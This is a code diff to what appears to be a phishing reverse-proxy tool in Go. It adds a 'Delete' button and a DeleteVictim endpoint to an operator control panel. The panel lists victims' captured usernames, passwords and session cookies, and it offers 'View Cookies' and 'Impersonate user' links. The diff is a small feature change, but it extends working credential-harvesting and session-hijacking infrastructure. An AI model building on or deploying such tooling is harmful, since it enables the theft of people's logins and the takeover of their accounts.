@@ -88,6 +88,16 @@ function clearcookies(){
     }
 };
 
+function deleteVictim(uuid){
+	$.ajax({
+		url: '/{{$.URL}}/DeleteVictim?user_id='+uuid,
+		type: 'DELETE',
+		success: function (result) {
+			document.location.reload()
+		}
+	});
+}
+
   </script>
 </head>
 <body>
@@ -120,7 +130,7 @@ function clearcookies(){
         <th class="text-center">Username</th>
         <th class="text-center">Password</th>
         <th class="text-center">Terminated</th>
-        <th class="text-center">Cookies</th>
+        <th class="text-center"></th>
 
       </tr>
     </thead>
@@ -143,7 +153,11 @@ function clearcookies(){
         {{end}}
         </td>
         {{/* This requires additional coding ... <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a> */}}
-        <td class="text-center"><a  href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
+        <td class="text-center">
+			<div class="btn-group" role="group">
+				<a href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
+				<button onclick="deleteVictim('{{.UUID}}')" class="btn btn-danger">Delete</button>
+			</div>
         </td>
 
       </tr>
@@ -520,6 +534,20 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 	return nil
 }
 
+func (config *ControlConfig) deleteEntry(victim *Victim) error {
+	entry, err := config.getEntry(victim)
+	if err == buntdb.ErrNotFound {
+		return nil
+	}
+
+	err = config.db.Update(func(tx *buntdb.Tx) error {
+		_, err := tx.Delete(entry.UUID)
+		return err
+	})
+
+	return err
+}
+
 func notifyCollection(victim *Victim) {
 
 	if victim.Username != "" && victim.Password != "" {
@@ -668,6 +696,26 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 
 	//v,_ :=json.Marshal(&victims)
 	//io.WriteString(w,string(v))
+}
+
+func HelloHandlerDeleteVictim(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodDelete {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	users, ok := r.URL.Query()["user_id"]
+
+	if !ok {
+		log.Infof("Url Param 'users_id' is missing")
+		return
+	}
+
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	err := CConfig.deleteEntry(&victim)
+	if err != nil {
+		log.Infof("Error %s", err.Error())
+	}
 }
 
 func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
@@ -977,6 +1025,7 @@ func init() {
 		handler.HandleFunc("/"+CConfig.url+"/ImpersonateFrames", use(HelloHandlerImpersonateFrames, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/DeleteVictim", use(HelloHandlerDeleteVictim, basicAuth))
 
 		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
 		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
